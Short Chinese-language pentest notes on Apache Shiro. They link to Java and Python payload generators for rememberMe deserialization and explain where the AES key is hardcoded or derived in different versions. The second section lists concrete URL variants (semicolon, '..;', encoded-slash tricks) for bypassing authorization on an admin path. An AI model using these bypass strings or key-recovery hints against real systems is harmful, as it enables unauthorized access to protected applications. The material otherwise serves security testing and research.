## Shiro反序列化
- [Java版payload生成](https://github.com/feihong-cs/ShiroExploit-Deprecated/blob/master/src/main/java/com/shiroexploit/core/AesEncrypt.java)
- [Python版payload生成](https://github.com/shadowsock5/Poc/blob/master/Shiro/shiro_deser.py)

### 说明
- 1.2.4的key硬编码在`org\apache\shiro\mgt\AbstractRememberMeManager.java`这个文件里；
- 1.2.4以上（1.2.5开始）的key在AbstractRememberMeManager构造方法里是这样写的：
```java
this.setCipherKey(cipherService.generateNewKey().getEncoded());
```
可以直接调这个接口，这样得到的key就是随机的。当然开发者也可以通过配置文件配置，比如`shiro.ini`, `xxx-shiro-xml`等制定一个自己实现的RememberMeManager（继承自`CookieRememberMeManager`），然后`applications.properties`里面配置这个硬编码的seed。如果攻击者知道了这个seed，可以方便地拿到shiro的key。
- 1.4.2以后，从`CBC`模式变成了`GCM`模式，需要相应地修改一下代码。

## Shiro权限绕过
比如想要访问的敏感url为：
```
/admin/index
```
假设`/static` 路径不需要认证即可访问。

绕过姿势：
- /admin/index/
- /;/admin/index
- /static;/admin/index
- /static;/../admin/index
- /static/..;/admin/index
- /admin/index%25%32%46index
- /admin/%3bindex


## 参考
- https://www.cnblogs.com/loong-hon/p/10619616.html
